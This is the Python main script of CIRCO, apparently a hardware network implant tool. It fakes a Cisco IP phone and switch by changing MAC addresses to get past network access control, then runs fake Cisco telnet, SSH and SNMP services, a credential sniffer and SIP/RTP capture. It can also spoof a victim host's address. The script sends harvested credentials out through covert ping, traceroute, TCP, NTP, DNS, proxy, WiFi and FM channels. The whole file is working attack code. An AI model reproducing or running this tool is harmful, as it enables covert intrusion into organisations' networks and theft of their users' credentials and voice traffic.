#!/usr/bin/env python3
import os
import re
import sys
import time
import queue
import signal
import logging
import argparse
import ipaddress
import threading
import subprocess
from scapy.all import *
from pyfiglet import Figlet
from dotenv import load_dotenv

from modules.tools.dhcp import DHCPHandler
from modules.tools.proxy import ProxyDiscovery
from modules.tools.sip import SIPHash
from modules.tools.rtp import RTPSniff
from modules.tools.victim import FindVictim
from modules.tools.netcreds import NetCreds
from modules.tools.alarm import LDRAlarm
from modules.tools.led import TurnLED

from modules.hpots.cdp import StartCDP
from modules.hpots.lldp import StartLLDP
from modules.hpots.telnetd import StartTelnet
from modules.hpots.sshd import StartSSH
from modules.hpots.snmp import StartSNMP
from modules.hpots.nmap import StartNmap

from modules.exfil.ping import ExfilPING
from modules.exfil.trace import ExfilTRACE
from modules.exfil.tcp import ExfilTCP
from modules.exfil.ntp import ExfilNTP
from modules.exfil.dns import ExfilDNS
from modules.exfil.prx import ExfilPrx
from modules.exfil.wifi import ExfilWifi
from modules.exfil.fm import ExfilFM


# Me
__author__ = 'Emilio / @ekio_jp'
__version__ = '2.020'


# Globals
cred = []
conf = {}


# Classes
class QueueMgr(threading.Thread):
    """
    Monitor hpots queue and append to cred list if unique
    """
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.magic = conf['MAGIC']

    def run(self):
        while not self.stoprequest.isSet():
            data = self.q.get()
            if data not in cred:
                cred.append(data)

    def join(self):
        self.stoprequest.set()


# Functions
def hextoip(ip):
    """
    Convert HEX IP to dotted format
    """
    n = 2
    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])

def discover(iface):
    """
    Sniff CDP/LLDP packets and collect peer details
    """
    lldpname = sniff(iface=iface, filter='ether proto 0x88cc', count=1, timeout=31)
    cdpname = sniff(iface=iface, filter='ether[20:2] == 0x2000', count=1, timeout=61)
    if cdpname:
        conf['CDPPEERINT'] = cdpname[0][CDPv2_HDR][CDPMsgPortID].iface.decode()
        conf['CDPPEERIP'] = cdpname[0][CDPv2_HDR][CDPAddrRecordIPv4].addr
        conf['CDPPEERMODEL'] = cdpname[0][CDPv2_HDR][CDPMsgPlatform].val.decode().split()[1]
        conf['CDPPEERNAME'] = cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val.decode().split('.')[0]
    if lldpname:
        conf['LLDPPEERINT'] = lldpname[0][LLDPDU][LLDPDUPortDescription].description.decode()
        conf['LLDPPEERIP'] = hextoip(lldpname[0][LLDPDU][LLDPDUManagementAddress].management_address.hex())
        conf['LLDPPEERNAME'] = lldpname[0][LLDPDU][LLDPDUSystemName].system_name.decode().split('.')[0]
    return conf['CDPPEERNAME'] or conf['LLDPPEERNAME']

def changemac(iface, newmac):
    """
    Take interface down before MAC changing
    """
    with open(os.devnull, 'w') as fdnull:
        subprocess.call(['ip', 'link', 'set', iface, 'down'], stdout=fdnull, stderr=subprocess.STDOUT)
        subprocess.call(['macchanger', '--mac', newmac, iface], stdout=fdnull, stderr=subprocess.STDOUT)
        subprocess.call(['ip', 'addr', 'flush', 'dev', iface], stdout=fdnull, stderr=subprocess.STDOUT)
        subprocess.call(['ip', 'link', 'set', iface, 'up'], stdout=fdnull, stderr=subprocess.STDOUT)

def setip(iface, ip, mask, gw, dns):
    """
    Replace add route, resolve and setup IP
    """
    with open(os.devnull, 'w') as fdnull, open('/etc/resolv.conf', 'w') as fdresolve:
        subprocess.call(['ip', 'a', 'add', ip + '/' + mask, 'dev', iface], stdout=fdnull, stderr=subprocess.STDOUT)
        subprocess.call(['route', 'add', 'default', 'gw', gw], stdout=fdnull, stderr=subprocess.STDOUT)
        subprocess.call(['echo', 'nameserver', dns], stdout=fdresolve, stderr=fdnull)

def newname(cname):
    """
    Generate fake switch name
    """
    cname = cname.split('.')[0]
    laststr = cname[-1:]
    if laststr.isdigit():
        total = int(laststr) + 2
        newswname = cname[:len(cname)-1] + str(total)
    else:
        newswname = cname + '01'
    return newswname

def kill_proc(pstring):
    """
    kill OS proccess
    """
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGKILL)

def snmptemplate():
    """
    Build SNMP OID Fake template
    """
    gwmachex = ' '.join(x for x in conf['GWMAC'].upper().split(':'))
    machex = ' '.join(x for x in conf['MAC'].upper().split(':'))
    hexip = ' '.join('%0.2X' % int(x) for x in conf['IP'].split('.')) + ' 00 A1'
    snmphex = ' '.join('%0.2X' % ord(x) for x in conf['SNMPC'])

    with open(conf['SNMPTPL'], 'r') as sfile:
        content = sfile.read()
        for repl in (('<NAME>', conf['NAME']),
                     ('<IP>', conf['IP']),
                     ('<MASK>', conf['MASK']),
                     ('<NET>', conf['NETIP']),
                     ('<GATEWAY>', conf['GWIP']),
                     ('<SERIAL>', conf['SERIAL']),
                     ('<SNPSU>', conf['SNPSU']),
                     ('<MACHEX>', machex),
                     ('<GWMAC>', gwmachex),
                     ('<SNMPHEX>', snmphex),
                     ('<IPHEX>', hexip)):
            content = content.replace(*repl)
    with open('snmpfake.tmp', 'w') as sfile:
        sfile.write(content)
    with open('agent.csv', 'w') as sfile:
        sfile.write('snmpfake.tmp' + ',' + conf['IP'] + ',' + conf['SNMPC'] + '\n')

def getpac(ip, url):
    """
    Connect to a potencial PAC URL and look for 'PROXY' lines, return a list
    """
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
            'Accept-Enconding': ', '.join(('gzip', 'deflate')),
            'Accept': '*/*',
            'Connection': 'keep-alive'
    }
    mm = set()
    if not url:
        pacurl = 'http://' + ip + '/'
    elif url == 'PAD':
        pacurl = 'http://' + ip + '/wpad.dat'
    else:
        pacurl = ip
    try:
        session = requests.get(pacurl, headers=headers)
        if session.status_code == 200:
            for x in range(len(session.content.split('\n'))):
                a = re.findall('PROXY ([0-9a-zA-Z.:-]+)', session.content.split('\n')[x])
                for m in range(len(a)):
                    if not re.search('127.0.0.1|localhost', a[m]):
                        mm.add(a[m])
        li = list(mm)
        li.sort()
        if li:
            return li
        else:
            return None
    except requests.exceptions.RequestException:
        return None

def telnetgrab(listip):
    """
    Telnet Banner Grabber
    """
    buf = ''
    for ip in listip:
        try:
            tn = telnetlib.Telnet(ip, 23, 3)
        except:
            continue
        try:
            buf = tn.read_until("sername: ", 3)
            break
        except:
            try:
                buf = tn.read_until("assword: ", 3)
                break
            except:
                try:
                    buf = tn.read_until("ogin: ", 3)
                    break
                except:
                    pass
    if buf:
        return buf
    else:
        return None

def parsingopt():
    """
    Options and help
    """
    f = Figlet(font='standard')
    print(f.renderText('CIRCO'))
    print('Author: {}'.format(__author__))
    print('Version: {}\n'.format(__version__))

    parser = argparse.ArgumentParser(add_help=True)
    command_group_mode = parser.add_mutually_exclusive_group(required=True)

    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable debugging')
    command_group_mode.add_argument('-i', dest='nic', metavar='<eth0>',
                        help='Single Mode: <eth0>')
    command_group_mode.add_argument('-b', '--bridge', action='store_true',
                        help='Bridge Mode: Use eth0 & eth1')
    parser.add_argument('-A', '--ALL', action='store_true',
                        help='All exfiltration')
    parser.add_argument('-p', '--ping', action='store_true',
                        help='PING exfiltration')
    parser.add_argument('-t', '--trace', action='store_true',
                        help='Traceroute exfiltration')
    parser.add_argument('-d', '--dns', action='store_true',
                        help='DNS exfiltration')
    parser.add_argument('-x', '--prx', action='store_true',
                        help='Proxy exfiltration')
    parser.add_argument('-n', '--ntp', action='store_true',
                        help='NTP exfiltration')
    parser.add_argument('-f', '--fm', action='store_true',
                        help='FM DRS exfiltration')
    parser.add_argument('-w', dest='wnic', metavar='<wlan1>',
                        help='Wireles exfiltration')
    parser.add_argument('--tcp', dest='tport', metavar='80',
                        help='TCP exfiltration')
    parser.add_argument('--spoof', action='store_true',
                        help='Spoofing MAC/IP (Proxy Excluded)')
    parser.add_argument('--voip', action='store_true',
                        help='Collect RTP and SIP credentials')
    parser.add_argument('-l', dest='logfile', metavar='<logfile>',
                        help='Log File (default <timestamp>.log')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except(argparse.ArgumentError):
            parser.error()
    else:
        parser.print_help()
        sys.exit(1)



def main():
    """
    Core program for CIRCO
    """

    ### Init Phase ###

    options = parsingopt()
    if options.verbose:
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)
        conf['DEBUG'] = True
    else:
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
        conf['DEBUG'] = False

    # Load Config
    basedir = os.path.abspath(os.path.dirname('.'))
    load_dotenv(os.path.join(basedir, 'env.default'))

    conf['PHRASE'] = os.environ.get('PHRASE')
    conf['SALT'] = os.environ.get('SALT')
    conf['SWMAC'] = os.environ.get('SWMAC')
    conf['PHONEMAC'] = os.environ.get('PHONEMAC')
    conf['SEED1'] = os.environ.get('SEED1')
    conf['SEED2'] = os.environ.get('SEED2')
    conf['SEED3'] = os.environ.get('SEED3')
    conf['MAGIC'] = os.environ.get('MAGIC')
    conf['WIFICHAN'] = os.environ.get('WIFICHAN')
    conf['INT'] = os.environ.get('INT')
    conf['SERIAL'] = os.environ.get('SERIAL')
    conf['SNPSU'] = os.environ.get('SNPSU')
    conf['SNMPC'] = os.environ.get('SNMPC')
    conf['CCHOST'] = os.environ.get('CCHOST')
    conf['CCNAME'] = os.environ.get('CCNAME')
    conf['DIRNAME'] = os.environ.get('DIRNAME')
    conf['SSIDROOT'] = os.environ.get('SSIDROOT')
    conf['SSIDALARM'] = os.environ.get('SSIDALARM')
    conf['WIFIMAC'] = os.environ.get('WIFIMAC')
    conf['SNMPTPL'] = os.environ.get('SNMPTPL')
    conf['TYPE'] = os.environ.get('TYPE')
    conf['FM'] = os.environ.get('FM')

    if options.logfile:
        logfile = options.logfile
    else:
        logfile = time.strftime("%Y%m%d%H%M%S.txt", time.gmtime())

    # Turn LED (power, network, PoE)
    TurnLED()

    # Create Queues
    hpots_q = queue.Queue()
    ping_q = queue.Queue()
    trace_q = queue.Queue()
    tcp_q = queue.Queue()
    ntp_q = queue.Queue()
    dns_q = queue.Queue()
    prx_q = queue.Queue()
    wifi_q = queue.Queue()
    fm_q = queue.Queue()
    alarm_q = queue.Queue()

    # scapy extra
    load_contrib('cdp')
    load_contrib('lldp')

    ### Discover Phase ###

    logging.debug('CDP/LLDP peer discovery')
    subprocess.call('/sbin/ip link set eth0 up', shell=True)
    peersw = discover('eth0')
    if peersw:
        conf['NAME'] = newname(peersw)
    else:
        conf['NAME'] = 'switch-test'

    ### Init Phase ###

    # Bring interface up
    if options.bridge:
        conf['IFACE'] = 'br0'
        subprocess.call('/sbin/ip link add name br0 type bridge', shell=True)
        subprocess.call('/sbin/ip link set eth0 master br0', shell=True)
        subprocess.call('/sbin/ip link set eth1 master br0', shell=True)
        subprocess.call('/sbin/ip addr flush dev br0', shell=True)
        subprocess.call('/sbin/ip link set br0 up', shell=True)
        subprocess.call('/sbin/ip link set eth1 up', shell=True)

        # Change MAC, became a Cisco Switch!
        logging.debug('Change MAC to fake switch: {}'.format(conf['SWMAC']))
        changemac(conf['IFACE'], conf['SWMAC'])
    else:
        # Change MAC, became a Cisco IP-Phone!
        conf['IFACE'] = options.nic
        logging.debug('Change MAC to fake phone: {}'.format(conf['PHONEMAC']))
        changemac(conf['IFACE'], conf['PHONEMAC'])

    #### Setup Phase ####

    # Request DCHP
    logging.debug('DHCP request started')
    dh = DHCPHandler(conf['IFACE'])
    dh.daemon = True
    dh.start()
    time.sleep(0.5)
    conf['MAC'] = get_if_hwaddr(conf['IFACE']).upper()
    xid = random.randint(0, 0xFFFF)
    dhcpdiscover = (Ether(src=conf['MAC'], dst='ff:ff:ff:ff:ff:ff') /
                    IP(src='0.0.0.0', dst='255.255.255.255') /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac2str(conf['MAC']), xid=xid) /
                    DHCP(options=[('message-type', 'discover'), 'end'])
                   )
    sendp(dhcpdiscover, iface=conf['IFACE'], verbose=0)
    time.sleep(10)
    conf['IP'], conf['MASK'], conf['GWIP'], conf['DNS'], conf['DOMAIN'], conf['WPAD'] = dh.join()
    conf['NETIP'] = str(ipaddress.IPv4Network(conf['IP'] + '/' + conf['MASK'],strict=False).network_address)

    # Configure interface
    logging.debug('Configure {} interface'.format(conf['IFACE']))
    setip(conf['IFACE'], conf['IP'], conf['MASK'], conf['GWIP'], conf['DNS'])

    # Send ARP WHO-HAS to grab MAC from default gateway
    logging.debug('Collect gateway ARP')
    query = Ether(src=conf['MAC'], dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, psrc=conf['IP'], pdst=conf['GWIP'])
    ans, a = srp(query, iface=conf['IFACE'], timeout=2, verbose=0)
    for a, rcv in ans:
        conf['GWMAC'] = rcv[Ether].src
        break

    # Pretend to be a phone to bypass NAC, tune the amount of time you want
    # This is need it when no phone plugged (single mode)
    if options.nic:
        phconf = conf.copy()
        phconf['INT'] = 'Port 1'
        phconf['NAME'] = 'SEP' + conf['PHONEMAC'].replace(':', '').upper()
        phconf['TYPE'] = 'phone'
        cdpph = StartCDP(phconf)
        cdpph.daemon = True
        cdpph.start()
        lldpph = LLDPHandler(phconf)
        lldpph.daemon = True
        lldpph.start()

        # Stop by calling .join() after X seconds (default 60sec)
        if options.verbose:
            logging.debug('CDP/LLDP as a Phone (verbose 10sec)')
            time.sleep(10)
        else:
            time.sleep(60)
        cdpph.join()
        lldpph.join()

        # Wait 300sec or more to clear MAC from peer switch (180sec to clear CDP)
        if options.verbose:
            logging.debug('Wait 300sec for MAC & CDP cache to clear (verbose 10sec)')
            time.sleep(10)
        else:
            time.sleep(300)

        # Change MAC to became a Cisco Switch (add default gateway again)
        logging.debug('Change MAC to fake switch: {}'.format(SWMAC))
        changemac(conf['IFACE'], conf['SWMAC'])
        with open(os.devnull, 'w') as fdnull:
            subprocess.call(['route', 'add', 'default', 'gw', conf['GWIP']], stdout=fdnull, stderr=subprocess.STDOUT)

    # Find Victim MAC/IP for Exfiltration Spoofing
    if options.spoof:
        logging.debug('Starting Spoof Discovery')
        vic = FindVictim(conf)
        vic.start()
        time.sleep(30)
        vmac, vip = vic.join()
        if vmac and vip:
            logging.debug('Spoof Using IP: {} and MAC: {}'.format(vip, vmac))
            conf['VMAC'] = vmac
            conf['VIP'] = vip
        else:
            # fallback to no-spoofing
            conf['VMAC'] = conf['MAC']
            conf['VIP'] = conf['IP']

    # Proxy discovery
    if options.prx or options.ALL:
        logging.debug('Starting Proxy Discovery')
        prxdh = ProxyDiscovery(conf)
        prxdh.daemon = True
        prxdh.start()
        time.sleep(20)
        prxlist = prxdh.join()
        conf['PRX'] = b''.join(prxlist)

    # Banner discovery
    logging.debug('Telnet Grabber')
    chkip = list(set([conf['GWIP'], conf['CDPPEERIP']]))
    banner = telnetgrab(chkip)
    if banner:
        conf['MOTD'] = re.sub('(\r\n\r\n\r\nUser Access Verification\r\n\r\n)|([uU]sername: )|([pP]assword: )|([lL]ogin: )', '', banner)
        conf['MOTD'] = conf['MOTD'].replace('\r\n', '<CR>')
    else:
        conf['MOTD'] = ''

    # net-creds
    logging.debug('Starting Net-Creds Sniffer')
    ncredsdh = NetCreds(hpots_q, conf)
    ncredsdh.daemon = True
    ncredsdh.start()

    #### Honeypots Phase ####

    # Cisco MAC format
    conf['MASKCIDR'] = str(sum([bin(int(x)).count('1') for x in conf['MASK'].split('.')]))
    conf['MACCISCO'] = '.'.join([conf['MAC'].replace(':','').lower()[x:x+4] for x in range(0,12,4)])
    conf['GWMACCISCO'] = '.'.join([conf['GWMAC'].replace(':','').lower()[x:x+4] for x in range(0,12,4)])

    logging.debug('SNMP fake template created')
    snmptemplate()

    if options.bridge and options.voip:
        logging.debug('Starting SIP Hash collector')
        siphp = SIPHash(hpots_q, conf)
        siphp.daemon = True
        siphp.start()

        logging.debug('Starting RTP Capture')
        rtphp = RTPSniff('eth1')
        rtphp.daemon = True
        rtphp.start()

    logging.debug('Starting CDP as switch')
    cdphp = StartCDP(conf)
    cdphp.daemon = True
    cdphp.start()

    logging.debug('Starting LLDP as switch')
    lldphp = StartLLDP(conf)
    lldphp.daemon = True
    lldphp.start()

    logging.debug('Starting IOS Telnet')
    telnethp = StartTelnet(hpots_q, conf)
    telnethp.daemon = True
    telnethp.start()

    logging.debug('Starting IOS SSH')
    sshhp = StartSSH(hpots_q, conf)
    sshhp.daemon = True
    sshhp.start()

    logging.debug('Starting IOS SNMP')
    kill_proc('snmposter')
    with open(os.devnull, 'w') as fdnull:
        subprocess.call(['/usr/local/bin/snmposter', '-f', 'agent.csv'], stdout=fdnull, stderr=subprocess.STDOUT)

    snmphp = StartSNMP(hpots_q, conf)
    snmphp.daemon = True
    snmphp.start()

    logging.debug('Starting NMAP OS Fooler')
    nmaphp = StartNmap(conf['IFACE'])
    nmaphp.daemon = True
    nmaphp.start()

    # Exfiltration Daemons

    if options.wnic:
        logging.debug('Start WIFI {} monitor mode in channel {}'.format(options.wnic, conf['WIFICHAN']))
        conf['WIFACE'] = options.wnic
        with open(os.devnull, 'w') as fdnull:
            subprocess.call(['ip', 'link', 'set', options.wnic, 'down'], stdout=fdnull, stderr=subprocess.STDOUT)
            time.sleep(0.3)
            subprocess.call(['iw', options.wnic, 'set', 'monitor', 'control'], stdout=fdnull, stderr=subprocess.STDOUT)
            time.sleep(0.3)
            subprocess.call(['ip', 'link', 'set', options.wnic, 'up'], stdout=fdnull, stderr=subprocess.STDOUT)
            time.sleep(0.3)
            subprocess.call(['iw', options.wnic, 'set', 'channel', conf['WIFICHAN']], stdout=fdnull, stderr=subprocess.STDOUT)

        logging.debug('Starting Exfiltration WIFI')
        exwifi = ExfilWifi(wifi_q, conf)
        exwifi.daemon = True
        exwifi.start()

    if options.ping or options.ALL:
        if options.spoof:
            logging.debug('Starting Exfiltration PING (Spoofing)')
            pingconf = conf.copy()
            pingconf['SWMAC'] = conf['VMAC']
            pingconf['IP'] = conf['VIP']
            exping = ExfilPING(ping_q, pingconf)
        else:
            logging.debug('Starting Exfiltration PING')
            exping = ExfilPING(ping_q, conf)
        exping.daemon = True
        exping.start()

    if options.trace or options.ALL:
        if options.spoof:
            logging.debug('Starting Exfiltracion Traceroute (Spoofing)')
            traceconf = conf.copy()
            traceconf['SWMAC'] = conf['VMAC']
            traceconf['IP'] = conf['VIP']
            extrace = ExfilTRACE(trace_q, traceconf)
        else:
            logging.debug('Starting Exfiltracion Traceroute')
            extrace = ExfilTRACE(trace_q, conf)
        extrace.daemon = True
        extrace.start()

    if options.tport or options.ALL:
        if options.spoof:
            logging.debug('Starting Exfiltracion TCP {} (Spoofing)'.format(options.tport))
            tcpconf = conf.copy()
            tcpconf['SWMAC'] = conf['VMAC']
            tcpconf['IP'] = conf['VIP']
            extcp = ExfilTCP((tcp_q, int(options.tport)), tcpconf)
        else:
            logging.debug('Starting Exfiltracion TCP {}'.format(options.tport))
            extcp = ExfilTCP((tcp_q, int(options.tport)), conf)
        extcp.daemon = True
        extcp.start()

    if options.ntp or options.ALL:
        if options.spoof:
            logging.debug('Starting Exfiltracion NTP (Spoofing)')
            ntpconf = conf.copy()
            ntpconf['SWMAC'] = conf['VMAC']
            ntpconf['IP'] = conf['IP']
            exntp = ExfilNTP(ntp_q, ntpconf)
        else:
            logging.debug('Starting Exfiltracion NTP')
            exntp = ExfilNTP(ntp_q, conf)
        exntp.daemon = True
        exntp.start()

    if options.dns or options.ALL:
        if options.spoof:
            logging.debug('Starting Exfiltracion DNS (Spoofing)')
            dnsconf = conf.copy()
            dnsconf['SWMAC'] = conf['VMAC']
            dnsconf['IP'] = conf['VIP']
            exdns = ExfilDNS(dns_q, dnsconf)
        else:
            logging.debug('Starting Exfiltracion DNS')
            exdns = ExfilDNS(dns_q, conf)
        exdns.daemon = True
        exdns.start()

    if options.prx or options.ALL:
        logging.debug('Starting Exfiltracion Proxy DNS')
        exprx = ExfilPrx(prx_q, conf)
        exprx.daemon = True
        exprx.start()

    if options.fm or options.ALL:
        logging.debug('Starting Exfiltracion FM')
        exfm = ExfilFM(fm_q, conf)
        exfm.daemon = True
        exfm.start()

    qmgr = QueueMgr(hpots_q, conf)
    qmgr.daemon = True
    qmgr.start()

    # Alarm Case
    alarmdh = LDRAlarm(hpots_q, conf)
    alarmdh.daemon = True
    alarmdh.start()

    # Main Loop to send credentials
    try:
        while True:
            for line in cred:
                if options.ping or options.ALL:
                    ping_q.put(line)
                if options.trace or options.ALL:
                    trace_q.put(line)
                if options.tport or options.ALL:
                    tcp_q.put(line)
                if options.ntp or options.ALL:
                    ntp_q.put(line)
                if options.dns or options.ALL:
                    dns_q.put(line)
                if options.prx or options.ALL:
                    prx_q.put(line)
                if options.wnic or options.ALL:
                    wifi_q.put(line)
                if options.fm or options.ALL:
                    fm_q.put(line)

                if options.verbose:
                    time.sleep(60)
                else:
                    time.sleep(3600)
                if line == conf['MAGIC']:
                    print('Sayonara!')

    except KeyboardInterrupt:
        cdphp.join()
        lldphp.join()
        telnethp.join()
        sshhp.join()
        kill_proc('snmposter')
        nmaphp.join()
        alarmdh.join()
        ncredsdh.join()
        if options.voip or options.ALL:
            siphp.join()
            rtphp.join()
        if options.ping or options.ALL:
            exping.join()
        if options.trace or options.ALL:
            extrace.join()
        if options.tport or options.ALL:
            extcp.join()
        if options.ntp or options.ALL:
            exntp.join()
        if options.dns or options.ALL:
            exdns.join()
        if options.prx or options.ALL:
            exprx.join()
        if options.wnic or options.ALL:
            exwifi.join()
        if options.fm or options.ALL:
            exfm.join()
        qmgr.join()
        sys.exit(0)


# Call main
if __name__ == '__main__':
    main()
